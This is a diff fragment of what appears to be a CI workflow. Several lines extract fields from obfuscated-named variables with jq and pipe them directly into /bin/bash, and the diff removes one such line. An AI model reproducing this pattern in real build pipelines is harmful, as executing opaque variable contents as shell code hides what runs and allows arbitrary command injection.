@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$ksgru4" | jq -r .l577 | /bin/bash
           echo $xmoel481 | jq -r .jdyi75006 | /bin/bash
           echo $lzn96 | jq -r .e656 | /bin/bash
-          echo $wpde41 | jq -r .oqjoe346 | /bin/bash
           echo $x22 | jq -r .gp24 | /bin/bash
 
       - name: Store artifact
